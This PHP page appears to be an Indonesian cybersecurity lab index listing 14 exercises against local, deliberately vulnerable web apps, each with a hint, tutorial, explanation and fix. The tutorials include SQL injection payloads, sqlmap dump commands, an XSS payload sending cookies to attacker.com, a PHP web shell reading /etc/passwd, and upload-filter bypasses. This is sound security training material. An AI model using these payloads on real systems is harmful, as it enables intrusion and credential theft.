<?php
$APPS = [
    'SIMPEG' => [
        'containers' => ['simpeg-web', 'simpeg-db', 'simpeg-phpmyadmin'],
        'url' => 'http://localhost:8080',
    ],
    'Fotorecv3' => [
        'containers' => ['fotorecv3-web', 'fotorecv3-db', 'fotorecv3-pma'],
        'url' => 'http://localhost:8082',
    ],
    'SPMB' => [
        'containers' => ['spmb-web', 'spmb-db', 'spmb-phpmyadmin'],
        'url' => 'http://localhost:8085',
    ],
];
$appStatus = [];
foreach ($APPS as $key => $app) {
    $output = @shell_exec("sudo docker ps --filter name={$app['containers'][0]} --format '{{.Names}}' 2>/dev/null");
    $appStatus[$key] = !empty(trim($output ?? ''));
}

$filterApp = $_GET['app'] ?? null;
if ($filterApp && !isset($APPS[$filterApp])) $filterApp = null;

$questions = [
    [
        'no' => 1,
        'title' => 'SQL Injection — Bypass Login (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/login.php',
        'level' => 'Mudah',
        'goal' => 'Masuk ke dashboard tanpa mengetahui username dan password yang valid.',
        'hint' => 'Coba masukkan tanda kutip ( \' ) di field username dan lihat pesan error-nya. Query SQL tidak difilter sama sekali.',
        'steps' => [
            'Buka http://localhost:8080/login.php',
            'Masukkan payload berikut di field Username: <code>\' OR \'1\'=\'1\' -- </code>',
            'Kosongkan password (atau isi sembarang)',
            'Klik Login',
            'Jika berhasil, Anda akan masuk ke dashboard sebagai admin.',
        ],
        'explanation' => 'Query yang dieksekusi: <code>SELECT * FROM users WHERE username = \'\' OR \'1\'=\'1\' -- \' AND password = \'...\'</code><br>Komentar <code>--</code> membuat pengecekan password diabaikan, dan <code>OR 1=1</code> membuat semua baris terpilih.',
        'fix' => 'Gunakan prepared statements / parameterized queries dengan bind_param(). Jangan pernah concatenate input user langsung ke query SQL.',
    ],
    [
        'no' => 2,
        'title' => 'SQL Injection — Ekstrak Data dengan UNION (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/pegawai_detail.php?id=1',
        'level' => 'Sedang',
        'goal' => 'Mengekstrak data dari tabel users melalui celah SQL Injection di halaman detail pegawai.',
        'hint' => 'Parameter <code>id</code> di URL tidak divalidasi. Coba tambahkan <code>UNION SELECT</code> untuk menggabungkan data dari tabel users.',
        'steps' => [
            'Buka http://localhost:8080/pegawai_detail.php?id=1',
            'Coba ganti id dengan: <code>1 UNION SELECT 1,username,password,role,nama FROM users</code>',
            'Perhatikan data username dan password dari semua user muncul di halaman.',
            'Coba juga: <code>1 UNION SELECT 1,username,password,role,nama FROM users WHERE id=1</code>',
        ],
        'explanation' => 'Query menjadi: <code>SELECT * FROM pegawai WHERE id = 1 UNION SELECT 1,username,password,role,nama FROM users</code><br>UNION menggabungkan hasil dua query. Jumlah kolom harus sama (5 kolom).',
        'fix' => 'Cast parameter id ke integer: <code>$id = (int)$_GET[\'id\'];</code> atau gunakan prepared statements.',
    ],
    [
        'no' => 3,
        'title' => 'IDOR — Akses Data Pegawai Lain (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/pegawai_detail.php?id=1',
        'level' => 'Mudah',
        'goal' => 'Mengakses detail pegawai lain hanya dengan mengubah ID di URL.',
        'hint' => 'Coba ganti angka <code>id</code> di URL dengan nomor lain. Tidak ada pengecekan otorisasi.',
        'steps' => [
            'Login sebagai user biasa (user1 / user123) atau admin',
            'Di dashboard, klik Detail pada pegawai mana saja',
            'Perhatikan URL: <code>pegawai_detail.php?id=1</code>',
            'Ganti <code>id=1</code> menjadi <code>id=3</code>, <code>id=5</code>, <code>id=10</code>',
            'Semua data bisa diakses tanpa batasan.',
        ],
        'explanation' => 'Aplikasi tidak memverifikasi apakah user yang login berhak mengakses data pegawai dengan ID tertentu. Siapa pun bisa mengakses data pegawai mana saja.',
        'fix' => 'Lakukan pengecekan otorisasi sebelum menampilkan data. Gunakan UUID atau token acak sebagai pengganti ID integer yang mudah ditebak.',
    ],
    [
        'no' => 4,
        'title' => 'IDOR — Lihat Password User Lain (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/profile.php',
        'level' => 'Mudah',
        'goal' => 'Melihat password (plaintext) user lain, termasuk admin.',
        'hint' => 'Halaman profil menerima parameter <code>id</code> via URL. Coba akses ID user lain.',
        'steps' => [
            'Login sebagai user1 / user123',
            'Klik "Profil Saya" di navbar',
            'URL akan seperti: <code>profile.php?id=2</code> (ID user Anda)',
            'Ganti <code>id=2</code> menjadi <code>id=1</code>',
            'Lihat password admin (p@sswoRd1234) muncul di halaman!',
        ],
        'explanation' => 'Parameter <code>id</code> bisa diubah oleh user. Aplikasi tidak memeriksa apakah ID tersebut milik user yang sedang login. Password disimpan dalam bentuk plaintext tanpa hash.',
        'fix' => 'Ambil ID user dari session (<code>$_SESSION[\'user_id\']</code>), bukan dari parameter URL. Hash password dengan <code>password_hash()</code>. Jangan pernah tampilkan password di halaman.',
    ],
    [
        'no' => 5,
        'title' => 'RBAC — Privilege Escalation (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/users.php',
        'level' => 'Sedang',
        'goal' => 'Mengakses halaman manajemen user yang seharusnya hanya untuk admin, padahal login sebagai user biasa.',
        'hint' => 'Coba akses langsung URL halaman admin meskipun login sebagai user biasa.',
        'steps' => [
            'Login sebagai user1 / user123',
            'Perhatikan navbar hanya menampilkan menu terbatas (tidak ada Manajemen User)',
            'Akses langsung: http://localhost:8080/users.php',
            'Halaman manajemen user terbuka!',
            'Coba hapus user admin dengan mengklik "Hapus"',
            'Atau edit role user Anda sendiri menjadi admin via modal Edit.',
        ],
        'explanation' => 'Pengecekan role hanya dilakukan di tampilan navbar (frontend), bukan di logika backend. Halaman users.php tidak memvalidasi role user sebelum memproses aksi.',
        'fix' => 'Tambahkan pengecekan role di setiap halaman admin: <code>if ($_SESSION[\'role\'] !== \'admin\') { die("Akses ditolak"); }</code>. Jangan hanya sembunyikan tombol di frontend.',
    ],
    [
        'no' => 6,
        'title' => 'XSS — Reflected Cross-Site Scripting (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/dashboard.php?search=<script>alert(1)</script>',
        'level' => 'Mudah',
        'goal' => 'Menyisipkan script JavaScript yang dieksekusi di halaman dashboard.',
        'hint' => 'Input pada kotak pencarian langsung ditampilkan kembali (reflected) tanpa sanitasi.',
        'steps' => [
            'Login ke SIMPEG',
            'Di kotak pencarian, masukkan: <code>&lt;script&gt;alert(\'XSS Berhasil!\')&lt;/script&gt;</code>',
            'Klik Cari',
            'Muncul pop-up alert! Script berhasil dieksekusi.',
            'Coba payload untuk mencuri cookie: <code>&lt;script&gt;document.location=\'http://attacker.com/?c=\'+document.cookie&lt;/script&gt;</code>',
        ],
        'explanation' => 'Nilai <code>$search</code> dari GET parameter langsung di-output ke HTML tanpa fungsi <code>htmlspecialchars()</code>. Browser mengeksekusi tag <code>&lt;script&gt;</code> karena dianggap sebagai kode HTML.',
        'fix' => 'Gunakan <code>htmlspecialchars($search, ENT_QUOTES, \'UTF-8\')</code> untuk semua output yang mengandung data user. Terapkan Content Security Policy (CSP) header.',
    ],
    [
        'no' => 7,
        'title' => 'File Upload — Upload Web Shell (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/upload.php',
        'level' => 'Sulit',
        'goal' => 'Mengupload file PHP berbahaya (web shell) untuk mendapatkan akses eksekusi perintah di server.',
        'hint' => 'Halaman upload tidak memvalidasi tipe file. Upload file .php lalu akses langsung.',
        'steps' => [
            'Login ke SIMPEG (sebagai user mana pun)',
            'Buka http://localhost:8080/upload.php',
            'Buat file shell.php dengan isi: <code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code>',
            'Upload file tersebut',
            'Akses: http://localhost:8080/uploads/shell.php?cmd=id',
            'Output akan menampilkan informasi user server (www-data)',
            'Coba: <code>?cmd=ls -la</code> atau <code>?cmd=cat /etc/passwd</code>',
        ],
        'explanation' => 'Tidak ada validasi ekstensi file, MIME type, atau ukuran. File .php bisa diupload dan dieksekusi langsung karena berada di dalam document root.',
        'fix' => 'Validasi ekstensi (whitelist .jpg, .png, dll), validasi MIME type dengan finfo, rename file dengan nama acak, simpan di luar document root, dan pasang .htaccess di folder uploads untuk memblokir eksekusi PHP.',
    ],
    [
        'no' => 8,
        'title' => 'SQL Injection — Ekstrak Data Foto (Fotorecv3)',
        'app' => 'Fotorecv3',
        'url' => 'http://localhost:8082/cat.php?id=1',
        'level' => 'Sedang',
        'goal' => 'Mengekstrak data dari database aplikasi fotografi melalui celah SQL Injection.',
        'hint' => 'Parameter <code>id</code> di halaman kategori langsung dimasukkan ke query SQL tanpa validasi. Coba dengan nilai negatif atau karakter khusus.',
        'steps' => [
            'Buka http://localhost:8082/',
            'Klik salah satu kategori (misal "Pemandangan Alam")',
            'Perhatikan URL: <code>cat.php?id=1</code>',
            'Coba: <code>cat.php?id=1 UNION SELECT 1,login,password,4 FROM users</code>',
            'Data username dan password (MD5 hash) akan muncul di halaman.',
            'Gunakan sqlmap untuk otomatisasi: <code>sqlmap -u "http://localhost:8082/cat.php?id=1" --batch --dump</code>',
        ],
        'explanation' => 'Query: <code>SELECT * FROM pictures where cat=1</code>. Parameter <code>$cat</code> langsung dari <code>$_GET["id"]</code> tanpa sanitasi. UNION SELECT bisa mengekstrak data dari tabel manapun.',
        'fix' => 'Cast parameter ke integer: <code>(int)$_GET["id"]</code>. Gunakan prepared statements. Jangan tampilkan error database ke user.',
    ],
    [
        'no' => 9,
        'title' => 'Authentication Bypass — Admin Panel (Fotorecv3)',
        'app' => 'Fotorecv3',
        'url' => 'http://localhost:8082/admin/login.php',
        'level' => 'Sedang',
        'goal' => 'Masuk ke panel admin tanpa mengetahui password yang benar.',
        'hint' => 'Coba SQL Injection di form login admin. Password diverifikasi menggunakan MD5.',
        'steps' => [
            'Buka http://localhost:8082/admin/login.php',
            'Di field Username, masukkan: <code>admin\' -- </code>',
            'Isi Password sembarang (misal: 123)',
            'Klik Login',
            'Anda masuk ke panel admin!',
            'Penjelasan: Query menjadi <code>SELECT * FROM users where login="admin\' -- " and password=md5("123")</code> — komentar <code>--</code> menghilangkan pengecekan password.',
            'Coba juga dengan sqlmap: <code>sqlmap -u "http://localhost:8082/admin/index.php" --data="user=admin&password=admin" --batch --dump</code>',
        ],
        'explanation' => 'Fungsi login menggunakan <code>$mysqli->real_escape_string()</code> pada parameter, namun password diverifikasi dengan <code>$user === $row[\'login\']</code>. Jika login berhasil karena SQLi, nilai session <code>$_SESSION["admin"]</code> tetap di-set.',
        'fix' => 'Gunakan prepared statements untuk query login. Jangan gunakan komentar SQL untuk bypass. Hash password dengan algoritma yang aman (bcrypt/argon2).',
    ],
    [
        'no' => 10,
        'title' => 'File Upload — Bypass Filter Ekstensi (Fotorecv3)',
        'app' => 'Fotorecv3',
        'url' => 'http://localhost:8082/admin/new.php',
        'level' => 'Sulit',
        'goal' => 'Mengupload file PHP ke server meskipun ada filter yang melarang ekstensi .php.',
        'hint' => 'Fungsi upload memblokir file .php, tetapi regex validasi filename punya celah. Coba ekstensi lain yang tetap dieksekusi sebagai PHP.',
        'steps' => [
            'Login ke admin fotorecv3: admin / p@sswoRd1234',
            'Buka http://localhost:8082/admin/new.php',
            'Perhatikan aturan: filename harus 3-12 huruf + titik + 2-4 huruf, dan tidak boleh .php',
            'Buat file dengan ekstensi <code>.phtml</code> atau <code>.php5</code> atau <code>.pht</code>',
            'Upload file dengan nama: <code>shell.phtml</code> berisi: <code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code>',
            'Akses: http://localhost:8082/admin/uploads/shell.phtml?cmd=id',
            'Atau eksploitasi bug regex: titik <code>.</code> di regex <code>/\w{3,12}\.\w{2,4}$/</code> sudah di-escape dengan benar, tapi coba bypass dengan double extension atau karakter khusus.',
        ],
        'explanation' => 'Filter hanya memblokir ekstensi <code>.php</code> secara eksplisit. Ekstensi lain seperti <code>.phtml</code>, <code>.php5</code>, <code>.pht</code> tetap dieksekusi sebagai PHP oleh server Apache jika terdaftar di konfigurasi.',
        'fix' => 'Gunakan whitelist ekstensi yang ketat: hanya izinkan <code>.jpg, .jpeg, .png, .gif</code>. Generate ulang nama file dengan <code>uniqid()</code>. Simpan file di luar document root. Konfigurasi Apache untuk hanya mengeksekusi ekstensi tertentu.',
    ],
    // ========== SPMB (Laravel) ==========
    [
        'no' => 11,
        'title' => 'IDOR — Akses Data Pendaftar Lain (SPMB)',
        'app' => 'SPMB',
        'url' => 'http://localhost:8085/spmb/pendaftar/1',
        'level' => 'Mudah',
        'goal' => 'Mengakses data pendaftar SPMB milik user lain hanya dengan mengubah ID di URL.',
        'hint' => 'Route <code>/spmb/pendaftar/{id}</code> tidak memeriksa kepemilikan data. Login sebagai user biasa lalu coba akses ID pendaftar lain.',
        'steps' => [
            'Login sebagai user biasa: <b>user01 / user123</b>',
            'Buka halaman <a href="http://localhost:8085/spmb/status" target="_blank">http://localhost:8085/spmb/status</a> untuk melihat pendaftaran Anda (ID=1)',
            'Klik "Detail" atau langsung akses: <code>http://localhost:8085/spmb/pendaftar/1</code> — data Budi Santoso milik Anda',
            'Ganti ID di URL: <code>http://localhost:8085/spmb/pendaftar/2</code> — lihat data Siti Rahmawati (milik user02)',
            'Ganti lagi: <code>http://localhost:8085/spmb/pendaftar/3</code> — lihat data Dian Permata Sari (milik admin)',
            '<b>Semua data pendaftar bisa diakses tanpa batasan</b> — tidak ada pengecekan apakah user yang login adalah pemilik data.',
        ],
        'explanation' => 'Controller method <code>SPMBController@detail($id)</code> hanya memanggil <code>Pendaftar::findOrFail($id)</code> tanpa memverifikasi bahwa <code>$pendaftar->user_id === Auth::id()</code>. Siapa pun bisa mengakses detail pendaftar mana pun dengan mengganti parameter ID di URL.',
        'fix' => 'Tambahkan pengecekan kepemilikan: <code>if ($pendaftar->user_id !== Auth::id() && Auth::user()->role !== \'administrator\') { abort(403); }</code>. Gunakan <code>Route::modelBinding</code> dengan policy atau gate untuk otorisasi.',
    ],
    [
        'no' => 12,
        'title' => 'RBAC — Akses Halaman Admin Tanpa Izin (SPMB)',
        'app' => 'SPMB',
        'url' => 'http://localhost:8085/admin/pendaftar',
        'level' => 'Sedang',
        'goal' => 'Mengakses halaman manajemen pendaftar dan user yang seharusnya hanya untuk administrator.',
        'hint' => 'Hanya route <code>/admin/dashboard</code> yang dilindungi middleware role. Route admin lainnya tidak ada pengecekan. Login sebagai user biasa lalu coba akses langsung.',
        'steps' => [
            'Login sebagai user biasa: <b>user01 / user123</b>',
            'Coba akses <code>http://localhost:8085/admin/dashboard</code> — akan ditolak (ini yang benar)',
            'Sekarang coba akses <code>http://localhost:8085/admin/pendaftar</code> — <b>berhasil!</b> Lihat semua data pendaftar',
            'Coba <code>http://localhost:8085/admin/pendaftar/1/edit</code> — bisa edit data pendaftar!',
            'Coba <code>http://localhost:8085/admin/users</code> — lihat daftar semua user sistem!',
            'Coba <code>http://localhost:8085/admin/users/1/edit</code> — bisa edit user admin dan mengubah role Anda sendiri menjadi administrator!',
        ],
        'explanation' => 'Di <code>routes/web.php</code>, hanya route <code>/admin/dashboard</code> yang menggunakan middleware <code>role:administrator</code>. Route lainnya seperti <code>/admin/pendaftar</code>, <code>/admin/users</code>, dll. tidak memiliki middleware proteksi role. Middleware <code>auth</code> hanya memastikan user login, bukan role-nya.',
        'fix' => 'Tambahkan middleware <code>role:administrator</code> ke semua route admin. Di Laravel bisa menggunakan <code>Route::middleware([\'auth\', \'role:administrator\'])->group()</code> atau dengan Route::prefix yang menerapkan middleware secara global.',
    ],
    [
        'no' => 13,
        'title' => 'File Upload — Upload Web Shell (SPMB)',
        'app' => 'SPMB',
        'url' => 'http://localhost:8085/spmb/daftar',
        'level' => 'Sulit',
        'goal' => 'Mengupload file PHP berbahaya (web shell) melalui formulir pendaftaran SPMB untuk mendapatkan akses eksekusi perintah di server.',
        'hint' => 'Form pendaftaran SPMB memiliki field upload foto dan dokumen tanpa validasi tipe file. Upload file .php lalu akses langsung dari browser.',
        'steps' => [
            'Login sebagai user mana pun: <b>user01 / user123</b>',
            'Buka <a href="http://localhost:8085/spmb/daftar" target="_blank">http://localhost:8085/spmb/daftar</a>',
            'Buat file <code>shell.php</code> dengan isi: <code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code>',
            'Isi semua field form dengan data sembarang (required)',
            'Upload file <code>shell.php</code> di field <b>Upload Foto</b> atau <b>Upload Dokumen</b>',
            'Submit form',
            'Cek folder uploads: akses <code>http://localhost:8085/uploads/NAMA_FILE_ANDA</code> — cari nama file dari response atau coba <code>http://localhost:8085/uploads/</code>',
            'Akses shell: <code>http://localhost:8085/uploads/1678901234_shell.php?cmd=id</code>',
            'Output akan menampilkan <code>www-data</code> — eksekusi perintah berhasil!',
        ],
        'explanation' => 'Di <code>SPMBController@submitRegistration</code>, method <code>$foto->move(public_path(\'uploads\'), $fotoName)</code> tidak melakukan validasi ekstensi file, MIME type, atau content type. Nama file asli dipertahankan (hanya ditambah timestamp). File PHP yang diupload bisa dieksekusi langsung karena berada di dalam document root <code>public/uploads/</code>.',
        'fix' => 'Validasi ekstensi file dengan whitelist: <code>$request->validate([\'foto\' => \'mimes:jpg,jpeg,png,gif|max:2048\'])</code>. Gunakan <code>$foto->store()</code> untuk menyimpan di storage (bukan public). Generate nama file acak dengan <code>Str::random(40)</code>. Pasang .htaccess di folder uploads: <code>SetHandler none</code> atau <code>php_flag engine off</code>.',
    ],
    [
        'no' => 14,
        'title' => 'CAPTCHA Bypass — Login Tanpa Captcha (SPMB)',
        'app' => 'SPMB',
        'url' => 'http://localhost:8085/login',
        'level' => 'Mudah',
        'goal' => 'Login tanpa perlu mengisi kode CAPTCHA yang benar.',
        'hint' => 'Validasi CAPTCHA memiliki celah: field captcha bisa dikosongkan, jawaban bisa dilihat dari API, dan kemungkinan jawaban sangat terbatas.',
        'steps' => [
            '<b>CARA 1 — Kosongkan field CAPTCHA:</b>',
            'Buka <a href="http://localhost:8085/login" target="_blank">http://localhost:8085/login</a>',
            'Masukkan username: <b>admin</b> dan password: <b>admin123</b>',
            'Biarkan field "Kode Captcha" <b>kosong</b>',
            'Klik Login — <b>berhasil masuk!</b>',
            '',
            '<b>CARA 2 — Lihat jawaban dari API:</b>',
            'Buka tab baru: <code>http://localhost:8085/captcha/generate</code>',
            'Response JSON: <code>{"num1":3,"num2":8}</code> — jumlahnya adalah 11',
            'Masukkan 11 di field captcha, login berhasil',
            '',
            '<b>CARA 3 — Brute force (hanya 19 kemungkinan):</b>',
            'Karena CAPTCHA hanya penjumlahan angka 1-10, hasilnya berkisar 2-20',
            'Cukup 19 percobaan untuk menemukan jawaban yang benar',
        ],
        'explanation' => 'Di <code>AuthController@login</code>: <code>if (\$captchaInput !== null && \$captchaInput !== \'\')</code> — jika field captcha dikosongkan, validasi dilewati sepenuhnya. Jawaban CAPTCHA juga disimpan di session dalam bentuk plaintext dan bisa diambil melalui endpoint <code>/captcha/generate</code> yang tidak memerlukan autentikasi. Selain itu, karena hanya penjumlahan 1-10, hanya ada 19 kemungkinan jawaban (2-20), sangat mudah dibruteforce.',
        'fix' => 'Hapus kondisi bypass: selalu validasi captcha. Gunakan library CAPTCHA yang sudah teruji (seperti <code>gregwar/captcha</code> atau Google reCAPTCHA). Jangan tampilkan jawaban di response API. Pastikan CAPTCHA hanya bisa digunakan sekali (one-time token). Gunakan HTTPS untuk mencegah man-in-the-middle.',
    ],
];
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab Keamanan Siber<?= $filterApp ? " - $filterApp" : '' ?> - Soal Praktik</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #0f0f1a;
            color: #e0e0e0;
            min-height: 100vh;
        }
        .container { max-width: 960px; margin: 0 auto; padding: 30px 20px; }
        h1 {
            text-align: center;
            font-weight: 300;
            font-size: 2em;
            margin-bottom: 8px;
            color: #fff;
        }
        .subtitle {
            text-align: center;
            color: #888;
            margin-bottom: 30px;
            font-size: 0.95em;
        }
        .nav-links {
            text-align: center;
            margin-bottom: 30px;
        }
        .nav-links a {
            color: #e94560;
            text-decoration: none;
            margin: 0 10px;
            padding: 6px 16px;
            border: 1px solid #e94560;
            border-radius: 6px;
            font-size: 0.9em;
            transition: all 0.2s;
        }
        .nav-links a.active {
            background: #e94560;
            color: #fff;
            cursor: default;
        }
        .nav-links a:hover {
            background: #e94560;
            color: #fff;
        }
        .soal {
            background: #1a1a2e;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 20px;
            border: 1px solid #2a2a4a;
            transition: border-color 0.2s;
        }
        .soal:hover { border-color: #e94560; }
        .soal-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 12px;
            flex-wrap: wrap;
        }
        .soal-no {
            background: #e94560;
            color: #fff;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 0.9em;
            flex-shrink: 0;
        }
        .soal-title {
            font-size: 1.15em;
            font-weight: 500;
            color: #fff;
            flex: 1;
        }
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 0.75em;
            font-weight: 600;
        }
        .badge-simpeg { background: rgba(233, 69, 96, 0.2); color: #e94560; }
        .badge-foto  { background: rgba(76, 175, 80, 0.15); color: #81c784; }
        .badge-spmb  { background: rgba(33, 150, 243, 0.15); color: #64b5f6; }
        .badge-easy  { background: rgba(76, 175, 80, 0.15); color: #81c784; }
        .badge-medium { background: rgba(255, 193, 7, 0.15); color: #ffd54f; }
        .badge-hard  { background: rgba(244, 67, 54, 0.15); color: #ef9a9a; }
        .soal-goal {
            background: rgba(21, 101, 192, 0.1);
            border-left: 3px solid #1976d2;
            padding: 10px 14px;
            margin-bottom: 12px;
            border-radius: 4px;
            font-size: 0.9em;
            color: #bbb;
        }
        .soal-goal strong { color: #64b5f6; }
        .status-summary {
            display: flex; gap: 16px; justify-content: center; flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .status-item {
            display: flex; align-items: center; gap: 8px;
            padding: 8px 16px; border-radius: 8px;
            font-size: 0.85em;
        }
        .status-item.on { background: rgba(76, 175, 80, 0.1); color: #81c784; }
        .status-item.off { background: rgba(244, 67, 54, 0.08); color: #e57373; }
        .stat-dot {
            width: 8px; height: 8px; border-radius: 50%; display: inline-block;
        }
        .stat-dot.green { background: #4caf50; }
        .stat-dot.red { background: #f44336; }
        .stat-toggle {
            color: #888 !important; font-size: 0.85em; border: none !important;
            padding: 2px 8px !important; margin: 0 !important;
        }
        .stat-toggle:hover { color: #e94560 !important; }
        .soal-locked { border-color: #2a2a2a !important; opacity: 0.7; }
        .soal-locked:hover { border-color: #2a2a2a !important; transform: none !important; }
        .soal-locked-msg {
            padding: 16px 20px; color: #777; font-size: 0.9em;
            display: flex; align-items: center; gap: 10px;
        }
        .lock-icon { font-size: 1.3em; }
        .togglers {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-bottom: 4px;
        }
        .togglers button {
            background: #0f3460;
            color: #a8a8b3;
            border: 1px solid #2a2a4a;
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85em;
            transition: all 0.2s;
        }
        .togglers button:hover {
            background: #1a1a2e;
            color: #fff;
            border-color: #e94560;
        }
        .togglers button.active {
            background: #e94560;
            color: #fff;
            border-color: #e94560;
        }
        .soal-content {
            display: none;
            margin-top: 12px;
            padding: 16px;
            background: #14142a;
            border-radius: 8px;
            border: 1px solid #2a2a4a;
        }
        .soal-content.show { display: block; }
        .soal-content h4 {
            color: #e94560;
            font-weight: 500;
            font-size: 0.95em;
            margin-bottom: 8px;
        }
        .soal-content ol {
            padding-left: 20px;
            line-height: 1.8;
            font-size: 0.9em;
        }
        .soal-content li { margin-bottom: 4px; }
        .soal-content code {
            background: #0f3460;
            padding: 1px 6px;
            border-radius: 3px;
            font-size: 0.9em;
            color: #ffd54f;
        }
        .soal-content a {
            color: #64b5f6;
            text-decoration: none;
        }
        .soal-content a:hover { text-decoration: underline; }
        .logo-section {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            margin-bottom: 4px;
        }
        .logo {
            width: 46px;
            height: 46px;
            flex-shrink: 0;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        .brand h1 {
            text-align: left;
            margin-bottom: 2px;
        }
        .brand .subtitle {
            text-align: left;
            margin-bottom: 0;
        }
        .badge-nick {
            text-align: center;
            margin-bottom: 24px;
            font-size: 0.82em;
            color: #666;
        }
        .badge-nick strong {
            color: #e94560;
            font-weight: 600;
        }
        .nick-icon {
            display: inline-block;
            vertical-align: middle;
            margin-right: 4px;
            color: #e94560;
        }
        .footer {
            text-align: center;
            margin-top: 40px;
            color: #555;
            font-size: 0.8em;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo-section">
        <div class="logo">
            <svg viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="lg" x1="0" y1="0" x2="60" y2="60">
                        <stop offset="0%" stop-color="#e94560"/>
                        <stop offset="100%" stop-color="#ff6b6b"/>
                    </linearGradient>
                    <linearGradient id="lg2" x1="0" y1="0" x2="60" y2="60">
                        <stop offset="0%" stop-color="#4fc3f7"/>
                        <stop offset="100%" stop-color="#1565c0"/>
                    </linearGradient>
                </defs>
                <rect x="8" y="18" width="44" height="30" rx="6" fill="url(#lg)" opacity="0.15"/>
                <path d="M30 8L12 18v14c0 10.5 7.2 20.3 18 22 10.8-1.7 18-11.5 18-22V18L30 8z" fill="url(#lg)" opacity="0.9"/>
                <path d="M30 12L16 20v12c0 8.4 5.8 16.2 14 17.5 8.2-1.3 14-9.1 14-17.5V20L30 12z" fill="url(#lg2)" opacity="0.8"/>
                <path d="M24 30l4 4 8-8" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
                <circle cx="30" cy="30" r="2" fill="#fff" opacity="0.3"/>
            </svg>
        </div>
        <div class="brand">
            <h1>Lab Keamanan Siber</h1>
            <p class="subtitle">14 Soal Praktik Pengujian Celah Keamanan Web
                <?php if ($filterApp): ?>
                — Filter: <strong><?= $filterApp ?></strong>
                <a href="lab.php" style="color:#888;font-size:0.8em;">[tampilkan semua]</a>
                <?php endif; ?>
            </p>
        </div>
    </div>
    <div class="badge-nick">
        <svg class="nick-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        Created by <strong>adpermana</strong>
    </div>

    <div class="status-summary">
        <?php foreach ($APPS as $key => $app): $on = $appStatus[$key]; ?>
        <span class="status-item <?= $on ? 'on' : 'off' ?>">
            <span class="stat-dot <?= $on ? 'green' : 'red' ?>"></span>
            <?= $key ?>: <?= $on ? 'Sedang Berjalan' : 'Berhenti' ?>
            <a href="/" class="stat-toggle"><?= $on ? 'Stop' : 'Start' ?></a>
        </span>
        <?php endforeach; ?>
    </div>

    <div class="nav-links">
        <a href="/">Launcher</a>
        <a href="lab.php">Semua</a>
        <a href="lab.php?app=SIMPEG" class="<?= $filterApp === 'SIMPEG' ? 'active' : '' ?>">SIMPEG</a>
        <a href="lab.php?app=Fotorecv3" class="<?= $filterApp === 'Fotorecv3' ? 'active' : '' ?>">Fotorecv3</a>
        <a href="lab.php?app=SPMB" class="<?= $filterApp === 'SPMB' ? 'active' : '' ?>">SPMB</a>
    </div>

    <?php foreach ($questions as $q):
        if ($filterApp && $q['app'] !== $filterApp) continue;
        $appRunning = $appStatus[$q['app']] ?? false;
    ?>
    <?php if ($appRunning): ?>
    <div class="soal" id="soal-<?= $q['no'] ?>">
        <div class="soal-header">
            <span class="soal-no"><?= $q['no'] ?></span>
            <span class="soal-title"><?= $q['title'] ?></span>
            <span class="badge <?= $q['app'] === 'SIMPEG' ? 'badge-simpeg' : ($q['app'] === 'Fotorecv3' ? 'badge-foto' : 'badge-spmb') ?>"><?= $q['app'] ?></span>
            <span class="badge <?= str_replace(['Mudah', 'Sedang', 'Sulit'], ['badge-easy', 'badge-medium', 'badge-hard'], $q['level']) ?>"><?= $q['level'] ?></span>
        </div>

        <div class="soal-goal">
            <strong>Tujuan:</strong> <?= $q['goal'] ?>
        </div>

        <div class="togglers">
            <button onclick="toggle('hint-<?= $q['no'] ?>', this)" class="active">Hint</button>
            <button onclick="toggle('steps-<?= $q['no'] ?>', this)">Tutorial</button>
            <button onclick="toggle('explain-<?= $q['no'] ?>', this)">Penjelasan</button>
            <button onclick="toggle('fix-<?= $q['no'] ?>', this)">Cara Memperbaiki</button>
        </div>

        <div id="hint-<?= $q['no'] ?>" class="soal-content show">
            <h4>Hint</h4>
            <p style="font-size:0.9em; color:#ffd54f; font-style:italic;"><?= $q['hint'] ?></p>
            <p style="margin-top:8px; font-size:0.85em; color:#666;">URL: <a href="<?= $q['url'] ?>" target="_blank"><?= htmlspecialchars($q['url']) ?></a></p>
        </div>

        <div id="steps-<?= $q['no'] ?>" class="soal-content">
            <h4>Tutorial Langkah demi Langkah</h4>
            <ol>
                <?php foreach ($q['steps'] as $s): ?>
                <li><?= $s ?></li>
                <?php endforeach; ?>
            </ol>
        </div>

        <div id="explain-<?= $q['no'] ?>" class="soal-content">
            <h4>Penjelasan Teknis</h4>
